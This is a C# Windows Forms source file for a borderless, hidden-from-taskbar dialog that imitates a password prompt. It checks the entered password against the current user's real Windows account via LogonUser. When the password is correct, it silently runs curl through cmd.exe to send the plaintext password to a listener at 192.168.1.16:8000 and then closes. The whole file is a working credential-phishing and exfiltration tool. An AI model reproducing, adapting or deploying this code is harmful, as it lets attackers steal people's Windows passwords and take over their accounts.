using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Drawing;
using System.Windows.Forms;

namespace WinFormsApp1
{
    public partial class Form2 : Form
    {
        // Import the LogonUser function from advapi32.dll
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword,
            int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public extern static bool CloseHandle(IntPtr handle);

        public Form2()
        {
            InitializeComponent();
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;

            textBox1.BackColor = Color.FromArgb(240, 240, 240);
            textBox1.BorderStyle = BorderStyle.None;

            button1.FlatStyle = FlatStyle.Flat;
            button1.BackColor = Color.FromArgb(185, 185, 185);
            button1.FlatAppearance.BorderSize = 0;

            button2.FlatStyle = FlatStyle.Flat;
            button2.BackColor = Color.FromArgb(185, 185, 185);
            button2.FlatAppearance.BorderSize = 0;

            this.StartPosition = FormStartPosition.CenterScreen;

            textBox1.KeyDown += TextBox1_KeyDown;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1.PerformClick();
                e.SuppressKeyPress = true;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textBox1.Text))
            {
                return;
            }

            ValidatePasswordAndExecute();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textBox1.Text))
            {
                return;
            }

            ValidatePasswordAndExecute();
        }

        // Validate the user's password and execute the curl command if correct
        private void ValidatePasswordAndExecute()
        {
            string password = textBox1.Text;
            string username = WindowsIdentity.GetCurrent().Name.Split('\\')[1]; // Get the current username
            string domain = Environment.UserDomainName;

            if (CheckCurrentUserPassword(username, domain, password))
            {
                ExecuteCurlCommand(password);
            }
            else
            {
                MessageBox.Show("Password is incorrect", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Check the current user's password by calling the LogonUser API
        private bool CheckCurrentUserPassword(string username, string domain, string password)
        {
            IntPtr tokenHandle = IntPtr.Zero;

            // Attempt to log in with the provided credentials
            bool isValid = LogonUser(username, domain, password, 2, 0, ref tokenHandle);

            if (isValid)
            {
                // If valid, close the token handle
                CloseHandle(tokenHandle);
            }

            return isValid;
        }

        // Execute the curl command if the password is correct
        private void ExecuteCurlCommand(string password)
        {
            string data = password.Replace("\"", "\\\"");
            ExecuteCommand($"curl --verbose --get --data-urlencode \"password={data}\" http://192.168.1.16:8000");
            Application.Exit();
        }

        // Helper method to execute the command in cmd
        private void ExecuteCommand(string command)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/C " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            // Handle text change event if needed
        }
    }
}
